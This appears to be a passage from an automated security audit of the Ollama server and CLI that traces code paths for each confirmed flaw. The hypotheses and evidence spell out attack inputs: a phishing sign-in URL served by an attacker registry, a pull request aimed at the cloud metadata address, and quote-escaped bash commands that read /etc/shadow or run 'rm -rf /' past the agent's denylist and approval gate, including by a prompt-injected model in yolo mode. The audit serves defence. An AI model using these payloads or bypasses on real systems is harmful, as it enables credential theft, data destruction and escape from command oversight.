- **Attack input**: Attacker hosts a "free models" registry. Victim runs `ollama pull free-registry.attacker.com/llama:latest`. The registry returns 401 with `WWW-Authenticate: Bearer realm="http://ollama.com.attacker.com/token",service="ollama.com"`. The client proceeds into `getAuthorizationToken`, which: (a) does NOT verify scheme (H-00.06), (b) returns 401 with JSON payload including `signin_url="https://ollama.com.attacker.com/signin?continue=https://ollama.com/&next=<hex-encoded JS>"`. The client CLI / UI opens that URL in the default browser. The attacker page presents a fake ollama.com sign-in form. Because the hostname has `ollama.com` as a left-side subdomain of `attacker.com`, casual URL inspection fails.
- **Code path (sketch)**: `POST /api/pull` → `pullModelManifest` → 401 → `getAuthorizationToken` → realm URL constructed from attacker bytes → response contains JSON `{signin_url: ...}` → CLI code at `server/routes.go:337,2005,2256` echoes `signin_url` into the `ollama` error → user copy-pastes or some UI auto-opens browser → phishing.
- **Preconditions**: victim pulls from attacker-controlled registry (can happen if attacker typosquats a model repo, OR if Modelfile `FROM` points at attacker's registry); UI or CLI honors `signin_url` (CLI certainly prints it, some UIs click it)
- **Trust boundary crossed**: registry (attacker) → local daemon → browser/user mental model; crosses the "registry SHOULD NOT dictate user-interactive URLs" boundary
- **Security consequence**: Credential phishing for ollama.com account. Harder to detect than normal phishing because the URL comes from the user's own ollama CLI/UI (high trust context). If user signs in, attacker captures the credential and can pivot via ollama.com to the victim's signing key management. Composes with H-00.04: after credential capture, attacker already has web_search access and full account control.
- **Severity estimate**: HIGH
- **Creativity signal**: The signin_url field looks benign — a UX hint. But it crosses from network-supplied data into a user-interactive URL, which is an "open-redirect-in-UX" primitive. Solo agents audit it as data; ideators recognize it as a phishing primitive. Combines with the realm-downgrade bug: the same registry that controls signin_url also controls the Authorization header's destination, so capturing the ed25519 sig AND phishing the password in parallel gives two independent takeover paths from ONE registry interaction.
- **Open questions for Tracer**: (1) Is there any scheme/host allowlist on `signin_url` before it is echoed to the user? (2) Does ollama-desktop auto-open the URL or just print it? (3) What is the source of `signin_url` in the 401 flow — is it attacker-controllable via registry response, or only from ollama.com? (4) Does `WhoamiHandler` also emit `signin_url` and propagate it to UI?

Deep-Probe-References:
- H-01 references PH-C-04, PH-C-05, PH-C-06, PH-C-10, PH-FG-05
- H-02 references PH-E-05 (extension, not duplicate)
- H-03 references PH-E-01, PH-E-02 (new collision angle)
- H-04 references PH-C-01, PH-C-15 (response-side extension)
- H-05 references PH-E-01, PH-E-04 (race extension)
- H-06 references PH-C-10, SAST-SQL-01, PH-FG-10
- H-07 references PH-FG-11, PH-C-07

Deferred candidates (one-liner only, if chamber chooses to add more):
- **H-08**: `OLLAMA_DEBUG=1` logs Authorization headers including ed25519 signatures — check `log.Printf` in cloud_proxy and auth.go for bearer/signing-material leakage.
- **H-09**: `WhoamiHandler` responds with `Access-Control-Allow-Origin: *` (CORS wildcard) → any webpage reads victim's public key and device fingerprint → fingerprinting + sign-in target identification.
- **H-10**: `webSearchPluginUpToDate` only checks `package.json` version string — attacker rolls BACKWARD by publishing `v999.0.0.malicious` with a version string BELOW `webSearchMinVersion`? Actually the comparison goes the other way — check if downgrade-to-older-malicious is possible via version spoofing.
- **H-11**: `isLocalIP` whitelist — does it include IPv6 ULA `fc00::/7` or link-local `fe80::/10`? IPv6 scoping rules can let attackers reach loopback-intended endpoints via `[::ffff:127.0.0.1]` which might not IsLoopback() in Go's netip parser.
- **H-12**: `CreateHandler` Modelfile `FROM` directive — if an attacker convinces user to `ollama create evil -f Modelfile` with `FROM https://attacker.com/model` — is that a distinct SSRF outside the `/api/pull` path?

---

### [TRACER] Evidence -- 2026-04-17T15:00:00Z

All line references confirmed against HEAD commit `57653b8e`. CodeQL artifacts consulted per Method 2.6. Manual traces performed where CodeQL coverage is absent.

---

#### H-00.01 — `allowedHostsMiddleware` eliminates all host validation on non-loopback bind

**Reachability: REACHABLE**

Code path:
1. `server/routes.go:1608` -- `allowedHostsMiddleware(s.addr)` is the second middleware registered on the gin engine (after cors).
2. `server/routes.go:1615` -- `if addr, err := netip.ParseAddrPort(addr.String()); err == nil && !addr.Addr().IsLoopback() { c.Next(); return }` — when `OLLAMA_HOST=0.0.0.0`, `addr.Addr()` is the unspecified address (`0.0.0.0`), for which `IsLoopback()` returns **false**. The condition is satisfied; `c.Next()` is called immediately, bypassing the rest of the function.
3. `server/routes.go:1620-1643` -- All Host-header checks and the terminal `c.AbortWithStatus(403)` are never reached.
4. Every route registered afterward — including `/api/pull` (line 1689), `/api/experimental/web_search` (line 1707), and `/api/me` (line 1696) — is reachable by any HTTP client that can reach the bound address.

Sanitizers on path:
- None reachable. The bypass is unconditional at line 1615 — the sanitization logic IS the bypassed code.

CodeQL slice: `query-http-handler-no-auth.json` returned 0 tuples. The gin conditional-middleware pattern is not modeled. `flow-paths-all-severities.md` informational note 1 confirms MaxBytesReader barrier is absent from the auth-response path — consistent with no active barrier here either.
On-demand query: none

**Assessment**: CONFIRMED. `OLLAMA_HOST=0.0.0.0` is the documented way to expose Ollama to the network in Docker, WSL2, and multi-host deployments. When active, ALL Host-header restrictions added by CVE-2024-28224 are silently disabled. Any network-reachable client has full unauthenticated access to every API endpoint.

---

#### H-00.02 — `allowedHost()` accepts lexically squatted `.localhost`/`.local`/`.internal` names

**Reachability: REACHABLE**

Code path:
1. `server/routes.go:1581-1606` -- `allowedHost(host)` lowercases the host and checks three suffix patterns via `strings.HasSuffix`.
2. `server/routes.go:1592-1603` -- `tlds := []string{"localhost","local","internal"}`. The loop `strings.HasSuffix(host, "."+tld)` accepts ANY hostname ending in `.localhost`, `.local`, or `.internal` — no IP-resolution step, no DNSSEC check.
3. `server/routes.go:1632` -- If `allowedHost` returns true, `c.Next()` proceeds for all methods except OPTIONS.
4. RFC 6761 §6.3 specifies that `.localhost` names MUST resolve to the loopback address without DNS — browsers honor this. An attacker-controlled page can craft a Host header of `evil.localhost` and browsers will treat same-origin restrictions as applying to `evil.localhost:11434`, which resolves to 127.0.0.1.

Sanitizers on path:
- `strings.HasSuffix` at line 1600 — purely lexical. **Not a security control** for the squatting vector. The RFC 6761 browser auto-resolution means no DNS infrastructure is needed.

CodeQL slice: not covered by any existing slice.
On-demand query: none

**Assessment**: CONFIRMED. This is the mechanism behind H-01's "drive-by" variant. Browsers auto-resolve `*.localhost` to 127.0.0.1 per RFC 6761 without any DNS, meaning an attacker can issue cross-origin requests to `http://evil.localhost:11434/api/me` from any webpage the victim visits and the Host check at `allowedHost` will pass because the host ends in `.localhost`.

---

#### H-00.03 — `OLLAMA_EXPERIMENT=client2` dispatches `/api/pull` and `/api/delete` before gin middleware

**Reachability: REACHABLE**

Code path:
1. `server/routes.go:92-96` -- `useClient2 = experimentEnabled("client2")` reads `os.Getenv("OLLAMA_EXPERIMENT")` at package init.
2. `server/routes.go:1735-1744` -- When `useClient2` is true, `GenerateRoutes` returns `&registry.Local{Fallback: r}` instead of `r` directly. The caller receives a `*registry.Local` as the HTTP handler.
3. `server/internal/registry/server.go:109-128` -- `(*Local).ServeHTTP` → `serveHTTP` — a raw `switch r.URL.Path` with no middleware invocation. `/api/delete` and `/api/pull` are dispatched directly. All other paths fall to `s.Fallback.ServeHTTP(rec, r)` which IS the gin engine with its middleware chain. The gin middleware (cors, `allowedHostsMiddleware`) only runs for the fallback paths.
4. `server/internal/registry/server.go:118-121` -- `case "/api/pull": return false, s.handlePull(rec, r)` executes with no Host validation.

Sanitizers on path:
- None in the client2 dispatch path. `handlePull` performs model-name validation and registry operations but no Host header check.

CodeQL slice: not covered; the `registry.Local` dispatch is a structural pattern not modeled as a data-flow source in CodeQL.
On-demand query: none

**Assessment**: CONFIRMED. When `OLLAMA_EXPERIMENT=client2` is set, two of the highest-risk endpoints (`/api/pull` with SSRF potential, `/api/delete` with model-deletion potential) bypass all gin middleware. This is a structural architecture gap, not a missing guard in a function.

---

#### H-00.04 — `readRequestBody` calls `io.ReadAll` with no size limit on non-zstd bodies

**Reachability: REACHABLE**

Code path:
1. `server/cloud_proxy.go:73-135` -- `cloudPassthroughMiddleware`: for `Content-Encoding: zstd`, line 89 wraps with `http.MaxBytesReader(..., maxDecompressedBodySize)` (20MB). For all other content-encodings (including plain JSON, no encoding, gzip, deflate), this branch is not taken.
2. `server/cloud_proxy.go:97` -- `body, err := readRequestBody(c.Request)` is called unconditionally when the body is non-zstd.
3. `server/cloud_proxy.go:289-300` -- `readRequestBody`: `body, err := io.ReadAll(r.Body)` — no size limit. The full HTTP request body is read into a `[]byte` in memory.
4. `server/routes.go:1966-1978` -- `webExperimentalProxyHandler` also calls `readRequestBody(c.Request)` directly with the same code path.

Sanitizers on path:
- `http.MaxBytesReader` at line 89 — only in the zstd branch. **Bypassed** by any content-encoding other than `zstd` (including omitting the header entirely).

CodeQL slice: `DFD-8-zstd-readall`, `reachable: false` — "No CodeQL path found — http.Response.Body to io.ReadAll with LimitReader barrier active". The `flow-paths-all-severities.md` informational note 3 states "http.MaxBytesReader — Not seen as an active barrier in the auth response reading path" — consistent with the manual finding that the cap is absent for non-zstd bodies.
On-demand query: none

**Assessment**: CONFIRMED. Any POST to `/v1/chat/completions`, `/v1/completions`, `/v1/responses`, `/v1/messages`, `/api/experimental/web_search`, or `/api/experimental/web_fetch` without `Content-Encoding: zstd` is fully buffered in RAM. A 4GB plain-JSON body triggers a 4GB allocation before any processing occurs.

---

#### H-00.05 — `/api/experimental/web_{search,fetch}` proxy victim's signing key with no local auth

**Reachability: REACHABLE**

Code path:
1. `server/routes.go:1707-1708` -- Both routes are registered directly on the gin router with no per-route auth middleware.
2. `server/routes.go:1958-1978` -- `webExperimentalProxyHandler` reads the body and calls `proxyCloudRequestWithPath(c, body, proxyPath, ...)`.
3. `server/cloud_proxy.go:179-213` -- `proxyCloudRequestWithPath` constructs the outbound request to `cloudProxyBaseURL + proxyPath` and calls `cloudProxySignRequest(outReq.Context(), outReq)`.
4. `server/cloud_proxy.go:360-373` -- `signCloudProxyRequest` signs with `auth.Sign(ctx, ...)` — uses `~/.ollama/id_ed25519` — when `req.URL.Hostname()` equals `cloudProxySigningHost` (default `ollama.com`).
5. Signed request is sent to `https://ollama.com/api/web_search` or `https://ollama.com/api/web_fetch` on behalf of the victim.

Sanitizers on path:
- `allowedHostsMiddleware` — the only guard. Bypassed by H-00.01 (non-loopback bind) or H-00.02 (`.localhost` suffix squatting).

CodeQL slice: `DFD-9-web-fetch-ssrf`, `reachable: true`, path_count: 1. Source: `os.Getenv('OLLAMA_HOST')` → sink: `http.NewRequest*` in cloud proxy handlers.
On-demand query: none

**Assessment**: CONFIRMED. If `allowedHostsMiddleware` is bypassed (H-00.01 or H-00.02), any client can instruct the local Ollama server to issue signed web-search or web-fetch requests to ollama.com using the victim's signing key. The attacker's query is attributed to and billed to the victim's account. The victim's query history on ollama.com is also poisoned.

---

#### H-00.06 — `getAuthorizationToken` validates host but not scheme — HTTP downgrade of ed25519 signed header

**Reachability: REACHABLE**

Code path:
1. `server/images.go:906-911` -- `makeRequestWithRetry` receives HTTP 401, calls `parseRegistryChallenge(resp.Header.Get("www-authenticate"))`.
2. `server/images.go:1018-1026` -- `parseRegistryChallenge` extracts the `Realm` field from the header using `getValue(authStr, "realm")`.
3. `server/auth.go:28-50` -- `registryChallenge.URL()` calls `url.Parse(r.Realm)` — no scheme validation.
4. `server/auth.go:59-62` -- `if redirectURL.Host != originalHost { return "", fmt.Errorf(...) }`. The check compares `redirectURL.Host` (the authority component, host+optional-port) to `originalHost`. If attacker sets `Realm="http://registry.example.com/token"` where `registry.example.com` is the legitimate registry hostname (host matches), the check PASSES.
5. `server/auth.go:75` -- `makeRequest(ctx, http.MethodGet, redirectURL, headers, nil, &registryOptions{})` — the request goes to the HTTP-scheme URL. The `Authorization: <ed25519 signature>` header at line 73 is transmitted in cleartext.

Sanitizers on path:
- `redirectURL.Host != originalHost` at line 60 — only compares host. Scheme is not checked. **Bypassable** by using an HTTP URL with the same hostname as the legitimate registry.

CodeQL slice: `DFD-13-gzip-bomb-auth`, `reachable: false`. "Built-in CodeQL auth.go path not confirmed. Manual review target: server/auth.go:81 io.ReadAll(response.Body) without size limit." Manual trace confirms the scheme-downgrade path independently of the gzip-bomb finding.
On-demand query: none

**Assessment**: CONFIRMED. This is a residual gap from CVE-2025-51471's fix: the host-equality check was added but scheme validation was not. A malicious registry can send `WWW-Authenticate: Bearer realm="http://same-host/token",service="..."` and the ed25519 signed `Authorization` header will be transmitted over plaintext HTTP to the attacker's endpoint. The `getValue` parser (see Spec Gap 13 note below) also affects how the realm URL is extracted.

---

#### H-00.07 — `/api/pull` has no host allowlist — SSRF to IMDS and arbitrary registries

**Reachability: REACHABLE**

Code path:
1. `server/routes.go:1689` -- `r.POST("/api/pull", s.PullHandler)` — no host-allowlist middleware.
2. Within `PullHandler`: `req.Name` is parsed by `model.ParseName` which calls `ParseNameBare` → `isValidPart` for each name component.
3. `types/model/name.go:344-372` -- `isValidPart` allows alphanumerics, `_`, `-`, `.`, `:` (for host kind). `169.254.169.254` passes this validator. Apostrophe `'` is NOT in the allowed set — SQL injection via model name is blocked at this layer (negates H-00.22/H-06 at the pull-name level).
4. `server/images.go:853-858` -- `pullModelManifest` builds `requestURL` from `n.BaseURL().JoinPath("v2", n.Namespace(), n.Model(), "manifests", n.Tag())`.
5. `server/images.go:890-933` -- `makeRequestWithRetry` issues GET to `requestURL`. For `169.254.169.254`, this hits AWS/GCP IMDS.
6. `server/images.go:921-927` -- Error path: `responseBody, err := io.ReadAll(resp.Body)` then `return nil, fmt.Errorf("%d: %s", resp.StatusCode, responseBody)` — IMDS response body reflected in error returned to API caller via `c.JSON`.

Sanitizers on path:
- `server/routes.go:271` -- `slices.Contains(envconfig.Remotes(), remoteURL.Hostname())` — applies ONLY in `GenerateHandler`/`ChatHandler` for models that have a `RemoteHost` config field set. Does NOT apply to `/api/pull`'s manifest fetching.
- `isValidPart` — prevents `'` and `;` in model name components, blocking SQL injection via the name field.

CodeQL slice: `go/request-forgery` finding at `server/images.go:992` (flow-paths-all-severities.md). call-graph-slices.json `DFD-9-web-fetch-ssrf`, `reachable: true`. The CodeQL finding directly corroborates manual trace.
On-demand query: none

**Assessment**: CONFIRMED. CodeQL `go/request-forgery` at `server/images.go:992` plus the absence of any host allowlist in `PullHandler` or `pullModelManifest` is conclusive. `POST /api/pull {"name":"169.254.169.254/library/x:latest","insecure":true}` reaches the IMDS and reflects the response. The `isValidPart` check DOES block apostrophe/semicolon characters in the name, which forecloses the SQL injection chain in H-06 at the model-name parsing level.

---

#### H-00.08 / H-00.09 / H-00.10 — Agent bash: metacharacter bypass, multi-arg bypass, denylist quoting bypass

**Reachability: REACHABLE**

Code path (H-00.08 metacharacter bypass):
1. `x/cmd/run.go:369` -- Tool-call loop (SEQUENTIAL — `for _, call := range pendingToolCalls`, no goroutines) processes each call.
2. `x/cmd/run.go:378` -- `agent.IsDenied(cmd)` runs substring check. For `cmd = "cat tools/file.go && cat /e''tc/shadow"`, pattern `/etc/shadow` is in `denyPatterns` at `x/agent/approval.go:117`. `strings.Contains("cat tools/file.go && cat /e''tc/shadow", "/etc/shadow")` = **false** (the `''` insertion breaks the match).
3. `x/cmd/run.go:404` -- `approval.IsAllowed("bash", args)` calls `extractBashPrefix("cat tools/file.go && cat /e''tc/shadow")`.
4. `x/agent/approval.go:206` -- `parts := strings.Split(command, "|")` — splits only on pipe. `parts[0]` is the full string `"cat tools/file.go && cat /e''tc/shadow"`.
5. `x/agent/approval.go:231-284` -- First path-like arg: `tools/file.go`. `path.Clean("tools/file.go") = "tools/file.go"`. No `..`. Returns `"cat:tools/"`.
6. If `"cat:tools/"` is in `a.prefixes` (from any prior approved `cat tools/<anything>`), `a.mu.RLock()` + `a.matchesHierarchicalPrefix("cat:tools/")` returns true → `IsAllowed` returns true.
7. `x/cmd/run.go:436` -- `toolRegistry.Execute(call)` → `x/tools/bash.go:64` -- `exec.CommandContext(ctx, "bash", "-c", "cat tools/file.go && cat /e''tc/shadow")`. Bash evaluates `&&` and executes both commands. `/e''tc/shadow` is resolved by bash as `/etc/shadow`.

Code path (H-00.09 multi-arg):
- `extractBashPrefix("cat tools/file.go /e''tc/passwd")` — first path-like arg is `tools/file.go` → prefix `"cat:tools/"`. Second arg `/e''tc/passwd` is never examined. `IsDenied` does not match the quoting-escaped path. Same outcome as H-00.08.

Code path (H-00.10 quoting bypass of IsDenied):
- `IsDenied("cat tools/f.go && rm -rf /")`: `strings.Contains("cat tools/f.go && rm -rf /", "rm -rf")` = true → **caught**.
- `IsDenied("cat tools/f.go && r''m -rf /")`: `strings.Contains("cat tools/f.go && r''m -rf /", "rm -rf")` = **false** → bypasses denylist. Bash evaluates `r''m` as `rm`.

Sanitizers on path:
- `IsDenied` at `x/agent/approval.go:175` — `strings.Contains` on literal strings. **Bypassable** via any bash quoting that inserts characters between the deny-pattern characters: `''`, `$''`, `""`, `\x??` hex escapes, `${IFS}`, brace expansion.
- `extractBashPrefix` path-escape checks — only reject `..` and absolute paths. Do not parse shell metacharacters.
- `isCommandOutsideCwd` at `x/agent/approval.go:312-374` — also called from the approval flow. For `cat tools/file.go && cat /etc/shadow`, splits on `|`, `;`, `&` (line 321) — note this function DOES split on `&`. However: (a) this function is not called in the main approval flow visible at `run.go:378-404`; its call site is elsewhere; (b) even if called, the split at `&` only triggers for bare `&`, not `&&` (field-splitting `&&` as two `&` chars would then split incorrectly).

CodeQL slice: `DFD-5-agent-bash`, `reachable: true`, path_count: 8. Sources include `RemoteFlowSource` and `os.Getenv`. Sinks: `exec.Command`/`exec.CommandContext`. `flow-paths-all-severities.md` custom query `exec-with-user-string` found 8 results.
On-demand query: none

**Assessment**: CONFIRMED. The sequential loop (not concurrent — negating H-05 race hypothesis), the `|`-only pipe split, and the `strings.Contains` denylist are all confirmed from source. Once any `cat:tools/`, `grep:tools/`, or `sed:tools/` prefix enters the session allowlist, the approval gate is permanently open for any command whose FIRST pipe-segment's first path-like argument starts with `tools/`, regardless of what else the command does.

---

#### H-00.11 — yolo mode: `IsDenied` still executes but is trivially bypassable; `IsAllowed` is skipped entirely

**Reachability: REACHABLE**

Code path:
1. `x/cmd/run.go:373-387` -- `IsDenied(cmd)` runs unconditionally in ALL modes (yolo or not). If it matches, the command is blocked and the loop continues.
2. `x/cmd/run.go:400` -- `if opts.YoloMode { fmt.Fprintf(os.Stderr, ...); }` — in yolo mode, this branch prints "running: ..." and does NOT call `approval.IsAllowed` or `approval.RequestApproval`. Execution proceeds directly to step 3.
3. `x/cmd/run.go:436` -- `toolRegistry.Execute(call)` — arbitrary command executes.

Sanitizers on path:
- `IsDenied` — the only guard in yolo mode. Bypassable as per H-00.10.

CodeQL slice: `DFD-5-agent-bash`, `reachable: true`.
On-demand query: none

**Assessment**: CONFIRMED WITH PRECISION. The claim in the pre-seed that yolo "skips IsDenied" is slightly inaccurate — `IsDenied` still runs. However, this is a minor distinction because `IsDenied` is trivially bypassable (H-00.10). The net security impact is the same: a prompt-injected model running under `--experimental-yolo` achieves full code execution with only the `IsDenied` substring filter as a barrier, which is easily defeated by shell quoting.

---

#### H-00.12 — `ensureWebSearchPlugin` tar extraction lacks Go-level path containment

**Reachability: PARTIAL**

Code path:
1. `cmd/launch/openclaw.go:771` -- `pack := exec.Command(npmBin, "pack", webSearchNpmPackage, "--pack-destination", pluginDir)` — `webSearchNpmPackage` is a constant (`@ollama/openclaw-web-search`). npm stdout is the only externally-influenced value.
2. `cmd/launch/openclaw.go:778` -- `tgzName := strings.TrimSpace(string(out))` — TrimSpace trims leading/trailing whitespace ONLY, not embedded newlines or other whitespace within the string. However, `npm pack` typically emits exactly one line: the tarball filename (e.g., `ollama-openclaw-web-search-1.0.0.tgz`). Influencing this string requires either (a) a malicious npm registry response or (b) an npm version that adds extra lines.
3. `cmd/launch/openclaw.go:779` -- `tgzPath := filepath.Join(pluginDir, tgzName)` — `filepath.Join` will normalize path separators but PRESERVES the filename as-is if it contains only non-separator characters. A filename like `../evil.tgz` would be normalized to escape `pluginDir` by `filepath.Join`'s behavior with `..`.
4. `cmd/launch/openclaw.go:782` -- `exec.Command("tar", "xzf", tgzPath, "--strip-components=1", "-C", pluginDir)` — No Go-level inspection of tar entries. The tarball's contents are extracted by the system `tar` binary. Entries with `../` in their paths or absolute paths can write outside `pluginDir` depending on the `tar` version and OS.

Sanitizers on path:
- `strings.TrimSpace` — only handles outer whitespace.
- `filepath.Join(pluginDir, tgzName)` — normalizes path components. A `tgzName` of `../evil.tgz` would resolve to one level above `pluginDir`, making `tgzPath` invalid as a tar source — this protects the source file path but NOT the tar entry paths within the archive.
- `--strip-components=1 -C pluginDir` — reduces one leading path component and sets extraction root, but does not prevent absolute paths or `../` after stripping.

CodeQL slice: `query-archive-extract-no-islocal.json` returned 0 findings. NOTE: This query targets Go-level `archive/zip` or `archive/tar` reads with `os.Create` without `filepath.IsLocal`. The `openclaw.go` path uses `exec.Command("tar", ...)` — a subprocess invocation — which CodeQL's Go extractor does not model. This is a confirmed false-negative in CodeQL coverage for this specific pattern.
On-demand query: none

**Assessment**: PARTIAL. The npm stdout influence requires a malicious npm registry or MITM (not a local attack). The tar-entry ZipSlip risk is real and unmitigated in Go code, but requires either (a) a malicious tarball served by npm or (b) a MITM on the npm registry connection (npm uses HTTPS by default, reducing this risk). The risk is real but conditional on supply-chain compromise. CodeQL gap confirmed.

---

#### H-00.13 — `$VISUAL`/`$EDITOR` env var → arbitrary binary execution via `exec.Command`

**Reachability: REACHABLE**

Code path:
1. `cmd/interactive.go:643-644` -- `editor := envconfig.Editor()` reads `OLLAMA_EDITOR` env var.
2. `cmd/interactive.go:646,649` -- Falls back to `os.Getenv("VISUAL")` then `os.Getenv("EDITOR")`.
3. `cmd/interactive.go:656` -- `name := strings.Fields(editor)[0]` — first space-separated token. If `editor = "malware --flag"`, then `name = "malware"`.
4. `cmd/interactive.go:657` -- `exec.LookPath(name)` — verifies existence in PATH. Not a security validation.
5. `cmd/interactive.go:675-677` -- `args := strings.Fields(editor); args = append(args, tmpFile.Name()); cmd := exec.Command(args[0], args[1:]...)`. For `editor = "malware --flag"`: `args = ["malware","--flag",tmpFile.Name()]`. `exec.Command("malware", "--flag", tmpFile.Name())` executes the malware binary with flag injection.

Sanitizers on path:
- `exec.LookPath(name)` — binary existence check only. Trivially satisfied if attacker places binary in any `$PATH` directory.

CodeQL slice: `DFD-5-agent-bash` / `exec-with-user-string` — 8 findings. `flow-paths-all-severities.md` custom query `exec-with-user-string` found `os.Getenv (EDITOR, VISUAL, PATH)` as sources with exec sinks. `entry-points.json` does not list this path directly (it is a CLI invocation, not an HTTP handler), but the `exec.Command` at `app/cmd/app.go:470` is the documented analog.
On-demand query: none

**Assessment**: CONFIRMED. An attacker with control over the process environment (CI runner, agent tool that sets env vars, malicious shell profile) can redirect `ollama run`'s interactive-mode editor invocation to any binary. The `strings.Fields` split enables flag injection alongside the binary name substitution.

---

#### H-00.14 — `/api/me` and `writeCloudUnauthorized` expose ed25519 public key to any unauthenticated caller

**Reachability: REACHABLE**

Code path:
1. `server/routes.go:1696` -- `r.POST("/api/me", s.WhoamiHandler)` — no auth middleware beyond `allowedHostsMiddleware`.
2. `server/routes.go:1981-2010` -- `WhoamiHandler` on "no user" (line 1997): calls `signinURL()`.
3. `server/routes.go:183-191` -- `signinURL()`: `auth.GetPublicKey()` reads `~/.ollama/id_ed25519` → derives public key → `base64.RawURLEncoding.EncodeToString([]byte(pubKey))` → included in `fmt.Sprintf(signinURLStr, url.PathEscape(h), encKey)`.
4. `server/routes.go:2005` -- `c.JSON(http.StatusUnauthorized, gin.H{"error": "unauthorized", "signin_url": sURL})` — public key is returned to the caller in `signin_url`.
5. `server/cloud_proxy.go:350-357` -- `writeCloudUnauthorized` similarly calls `cloudProxySigninURL()` → `signinURL()` and includes the public key in 401 responses from any failed cloud proxy attempt.
6. `server/routes.go:337` -- In `GenerateHandler`, auth errors from remote call also trigger `signinURL()` and return the URL with embedded public key.

Sanitizers on path:
- `allowedHostsMiddleware` — only protection. Bypassed by H-00.01 and H-00.02.

CodeQL slice: not covered by a dedicated slice. `entry-points.json` lists `server/routes.go:1546` (Body) and `server/routes.go:1494-1553` (Param calls) as remote sources, which are on adjacent routes.
On-demand query: none

**Assessment**: CONFIRMED. `POST /api/me` with any body is sufficient to trigger the public-key disclosure when the user is not signed in (the common case). The CORS config allows `app://*`, `file://*`, `tauri://*`, `vscode-webview://*`, `vscode-file://*` origins explicitly (`envconfig/config.go:100-106`), meaning desktop applications loading local content can make cross-origin requests to the local Ollama server and read the public key.

---

#### H-00.15 — `auth/auth.go` loads `~/.ollama/id_ed25519` with no permission or symlink check

**Reachability: REACHABLE**

Code path:
1. `auth/auth.go:22-42` -- `GetPublicKey()`: `os.ReadFile(filepath.Join(home, ".ollama", "id_ed25519"))` — no `os.Lstat`, no mode check, no owner check. Follows symlinks silently.
2. `auth/auth.go:53-85` -- `Sign(ctx, bts)`: same `os.ReadFile(keyPath)` pattern. No validation.
3. `cmd/cmd.go` (~line 1840, `initializeKeypair`) creates `~/.ollama/` with `os.MkdirAll(..., 0o755)` — world-listable. Key file created with `os.WriteFile(..., 0o600)`. No re-check on subsequent reads.

Sanitizers on path:
- None. `os.ReadFile` follows symlinks by design. The `eb0a5d44` companion fix added `info.Mode().IsRegular()` only for the now-removed system-path case; the home-path case never had this check.

CodeQL slice: not modeled.
On-demand query: none

**Assessment**: CONFIRMED. Any local user can `ls ~/.ollama/` (due to `0o755` directory mode) and observe whether a key file exists. If an attacker has write access to `~/.ollama/` (shared home dir, misconfigured container, CI runner with mounted workspace), they can replace `id_ed25519` with a symlink pointing to their own key. All subsequent `Sign` and `GetPublicKey` calls will use the attacker's key without any error or warning.

---

#### H-00.22 — SAST-SQL-01: `app/store/database.go:64` `fmt.Sprintf` in SQL context

**Reachability: UNREACHABLE (via the pre-seeded attack path)**

Code path:
1. `app/store/database.go:64` -- `schema := fmt.Sprintf(\`CREATE TABLE IF NOT EXISTS settings ... schema_version INTEGER NOT NULL DEFAULT %d\`, schemaVersion)` — the only `fmt.Sprintf` call in this file.
2. The `%d` placeholder substitutes an integer `schemaVersion` constant (a compile-time or package-level constant integer representing the current DB schema version). No user-supplied data flows into this `Sprintf` call.
3. All actual data operations in `database.go` use parameterized queries (`?` placeholders passed to `tx.Exec(query, arg1, arg2, ...)` — verified at lines 717-722, 728, 970-972, etc.).

Sanitizers on path:
- The `fmt.Sprintf` at line 64 produces schema DDL (not DML) and uses only a constant integer. There is no user-input path to this statement.
- `isValidPart` in `types/model/name.go:344-372` blocks apostrophe and semicolon in model name components, preventing SQL metacharacter injection through the model-name path.

CodeQL slice: `sinks.json` lists `app/store/database.go:678` and `:941` and `:1101` as `deserialization sink` (Unmarshal calls), not SQL injection sinks. No SQL injection sinks are listed for this file.
On-demand query: none

**Assessment**: UNREACHABLE as described. The `fmt.Sprintf` at `database.go:64` is a false positive: it uses a constant integer schema version, not user data. The SAST-SQL-01 pre-seed is not confirmed at this location. All data-layer SQL operations use parameterized queries.

---

#### H-01 — Full remote identity theft chain: `.localhost` browser auto-resolution → unauth web_search → signed query to attacker

**Reachability: REACHABLE (partially — key steps confirmed; MITM step requires attacker network position)**

Code path:
1. `server/routes.go:1592-1603` -- `strings.HasSuffix(host, ".localhost")` matches `evil.localhost`. Browsers resolve `*.localhost` to 127.0.0.1 per RFC 6761 without DNS infrastructure. Host check passes.
2. `server/routes.go:1707` -- `/api/experimental/web_search` reachable (no auth, H-00.05 confirmed).
3. `server/cloud_proxy.go:360-373` -- Outbound request to `https://ollama.com/api/web_search` signed with victim's ed25519 key.
4. H-00.06 (scheme downgrade) requires the attacker to also control the 401 response from ollama.com during the signing step — this requires MITM positioning or DNS control for ollama.com, which is a higher bar.
5. Steps 1-3 (drive-by → unauth proxy → victim key used) are fully reachable. Step 4 (key capture) requires MITM.

Sanitizers on path:
- `corsConfig.AllowWildcard = true` at `routes.go:1648` — with `AllowedOrigins` defaulting to localhost/127.0.0.1/0.0.0.0 variants, cross-origin from `evil.localhost` may or may not pass CORS depending on whether the gin CORS middleware matches. However, `AllowWildcard = true` with the `cors.DefaultConfig()` means wildcard `*` origins are accepted. If CORS preflight blocks the request, the Host-check bypass via `allowedHostsMiddleware` is moot for browser-originated requests.

**Precision note on CORS**: `corsConfig.AllowOrigins = envconfig.AllowedOrigins()` sets the list to the localhost-family list. The `cors` library with `AllowWildcard = true` interprets wildcard characters IN the allowed origins list, not as "allow all origins". So `evil.localhost` origin may NOT pass the CORS check even if the Host check passes. This is a partial mitigation that the Advocate should examine.

CodeQL slice: DFD-9-web-fetch-ssrf, reachable: true.
On-demand query: none

**Assessment**: PARTIAL. Steps 1-3 are fully reachable. The CORS behavior for `evil.localhost` origin needs Advocate verification — if gin-cors blocks the browser request despite the Host-check pass, the browser-drive-by vector is partially blocked (though non-browser clients like `curl` would still succeed since they don't enforce CORS). Step 4 (key capture) requires MITM positioning on the victim's outbound traffic.

---

#### H-02 — npm pack stdout line injection → tar flag injection

**Reachability: PARTIAL**

Code path:
1. `cmd/launch/openclaw.go:778` -- `tgzName := strings.TrimSpace(string(out))` — if npm pack outputs multiple lines (e.g., progress output followed by filename), `TrimSpace` strips outer whitespace but the string retains internal newlines. `filepath.Join(pluginDir, "evil.tgz\n--checkpoint...")` embeds the newline in the path string.
